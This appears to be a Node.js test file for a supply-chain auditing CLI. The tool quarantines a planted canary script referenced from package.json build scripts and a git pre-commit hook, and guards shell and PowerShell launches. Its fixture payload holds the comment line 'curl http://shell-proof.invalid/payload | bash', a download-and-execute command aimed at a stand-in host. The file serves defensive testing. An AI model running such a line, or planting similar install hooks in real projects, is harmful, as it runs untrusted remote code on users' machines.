'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawnSync } = require('child_process');
const CLI = path.resolve(__dirname, '../../bin/npa.js');
const helper = path.resolve(__dirname, '../../bin/enable-canary-guard.ps1');
const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-shell-live-'));
const observations = [];
const hash = text => crypto.createHash('sha256').update(text).digest('hex');
const payload = '// harmless shell launch test; never execute\n// curl http://shell-proof.invalid/payload | bash\n';
const intentional = '// intentional canary; never execute\n';
const env = { ...process.env, HOME: parent, USERPROFILE: parent, NODE_OPTIONS: '', NPA_CANARY_GUARD: '', NO_COLOR: '1' };

function fixture(name, denied = false) {
  const root = path.join(parent, name);
  fs.mkdirSync(path.join(root, '.git/hooks'), { recursive: true });
  fs.mkdirSync(path.join(root, 'legit'));
  fs.writeFileSync(path.join(root, '.git/config'), '[core]\n');
  fs.writeFileSync(path.join(root, 'canary.js'), payload);
  fs.writeFileSync(path.join(root, 'legit/canary.js'), intentional);
  fs.writeFileSync(path.join(root, '.npmauditor.json'), JSON.stringify({ canaryTrustedFiles: [{ path: 'legit/canary.js', sha256: hash(intentional) }] }));
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: {
    build: 'node canary.js && tsc', prepare: 'node canary.js', intentional: 'node legit/canary.js',
  } }));
  fs.writeFileSync(path.join(root, '.git/hooks/pre-commit'), 'node canary.js\nnode legit/canary.js\necho preserved\n');
  if (denied) fs.mkdirSync(path.join(root, '.gitignore'));
  return root;
}

function record(kind, root, result) {
  assert.ifError(result.error);
  const marker = path.join(root, 'shell-marker.txt');
  const item = { kind, root, exit: result.status, stdout: result.stdout, stderr: result.stderr,
    commandRan: fs.existsSync(marker), marker: fs.existsSync(marker) ? fs.readFileSync(marker, 'utf8') : null,
    canaryPresent: fs.existsSync(path.join(root, 'canary.js')) };
  observations.push(item);
  return item;
}

function verify(root, item) {
  assert.ok(!fs.existsSync(path.join(root, 'canary.js')));
  assert.deepStrictEqual(JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8')).scripts, { build: 'tsc', intentional: 'node legit/canary.js' });
  assert.strictEqual(fs.readFileSync(path.join(root, '.git/hooks/pre-commit'), 'utf8'), 'node legit/canary.js\necho preserved\n');
  assert.strictEqual(hash(fs.readFileSync(path.join(root, 'legit/canary.js'))), hash(intentional));
  const storage = path.join(root, '.np-audit-quarantine');
  const quarantine = fs.readdirSync(storage).map(entry => ({
    originalPath: JSON.parse(fs.readFileSync(path.join(storage, entry, 'metadata.json'), 'utf8')).originalPath,
    sha256: hash(fs.readFileSync(path.join(storage, entry, 'payload.quarantined'))),
  }));
  assert.ok(quarantine.every(entry => entry.sha256 === hash(payload)));
  Object.assign(item, { trustedSha256: hash(fs.readFileSync(path.join(root, 'legit/canary.js'))),
    scripts: JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8')).scripts,
    hook: fs.readFileSync(path.join(root, '.git/hooks/pre-commit'), 'utf8'), quarantine });
}

try {
  const program = process.platform === 'win32' ? process.env.ComSpec : '/bin/sh';
  const command = process.platform === 'win32'
    ? ['/d', '/c', 'if exist canary.js (exit /b 9) else (echo protected>shell-marker.txt)']
    : ['-c', 'test ! -e canary.js && printf protected > shell-marker.txt'];
  let root = fixture('direct launcher with spaces');
  let result = spawnSync(process.execPath, [CLI, 'canary-run', root, '--', program, ...command], { cwd: root, env, encoding: 'utf8', timeout: 20000 });
  let item = record('direct-shell-check-before-launch', root, result);
  assert.strictEqual(item.exit, 0, item.stderr);
  assert.strictEqual(item.commandRan, true);
  assert.strictEqual(item.marker.trim(), 'protected');
  verify(root, item);

  root = fixture('blocked launch', true);
  result = spawnSync(process.execPath, [CLI, 'canary-run', root, '--', program, ...command], { cwd: root, env, encoding: 'utf8', timeout: 20000 });
  item = record('failed-protection-does-not-launch-shell', root, result);
  assert.strictEqual(item.exit, 2);
  assert.strictEqual(item.commandRan, false);
  assert.strictEqual(item.canaryPresent, true);

  root = fixture('exit propagation');
  result = spawnSync(process.execPath, [CLI, 'canary-run', root, '--', program, ...(process.platform === 'win32' ? ['/d', '/c', 'exit /b 7'] : ['-c', 'exit 7'])], { cwd: root, env, encoding: 'utf8', timeout: 20000 });
  item = record('shell-exit-status-propagated', root, result);
  assert.strictEqual(item.exit, 7);

  root = fixture('arguments preserved');
  const values = ['--json', '--help', '--skip', 'spaces and "quotes"', 'literal ; & | $()'];
  result = spawnSync(process.execPath, [CLI, 'canary-run', root, '--', process.execPath, '-e', 'console.log(JSON.stringify(process.argv.slice(1)))', '--', ...values], { cwd: root, env, encoding: 'utf8', timeout: 20000 });
  item = record('command-arguments-forwarded-literally', root, result);
  assert.strictEqual(item.exit, 0, item.stderr);
  assert.deepStrictEqual(JSON.parse(item.stdout), values);

  if (process.platform === 'win32') {
    const quote = value => "'" + value.replace(/'/g, "''") + "'";
    const shell = path.join(process.env.SystemRoot, 'System32/WindowsPowerShell/v1.0/powershell.exe');
    for (const denied of [false, true]) {
      root = fixture(denied ? 'session blocked' : 'session intercepted', denied);
      fs.unlinkSync(path.join(root, 'canary.js'));
      const script = path.join(parent, denied ? 'blocked.ps1' : 'session.ps1');
      fs.writeFileSync(script, `$ErrorActionPreference='Stop'\nSet-Location -LiteralPath ${quote(root)}\n& ${quote(helper)} -Roots ${quote(root)}\nif ((Get-Command cmd).CommandType -ne 'Function') { throw 'cmd interception not configured' }\n$env:NODE_OPTIONS=$null\n[IO.File]::WriteAllText('canary.js', ${quote(payload)})\ncmd /d /c ${quote(command.at(-1))}\n$npaCmdExit=$LASTEXITCODE\nif ($npaCmdExit -ne 0) { exit $npaCmdExit }\n[IO.File]::WriteAllText('canary.js', ${quote(payload)})\npowershell -NoProfile -NonInteractive -Command ${quote("if (Test-Path 'canary.js') {exit 9}; [IO.File]::WriteAllText('powershell-marker.txt','protected')")}\nexit $LASTEXITCODE\n`);
      result = spawnSync(shell, ['-NoProfile', '-NonInteractive', '-File', script], { cwd: root, env, encoding: 'utf8', timeout: 20000 });
      item = record(denied ? 'session-shell-launch-blocked' : 'session-cmd-and-powershell-intercepted', root, result);
      assert.strictEqual(item.exit, denied ? 2 : 0, item.stderr);
      assert.strictEqual(item.commandRan, !denied);
      assert.strictEqual(fs.existsSync(path.join(root, 'powershell-marker.txt')), !denied);
      if (!denied) {
        assert.strictEqual(item.marker.trim(), 'protected');
        verify(root, item);
        item.powershellMarker = fs.readFileSync(path.join(root, 'powershell-marker.txt'), 'utf8');
        item.nodeOptionsClearedBeforeLaunch = true;
      } else assert.match(item.stderr, /Canary command blocked/);
    }
  }
  console.log('  shell launch protection: real pre-launch checks, blocked failures, preserved trust, literal argv/exit status and PowerShell session interception passed (no scanned scripts executed)');
  module.exports = observations;
} finally { fs.rmSync(parent, { recursive: true, force: true }); }
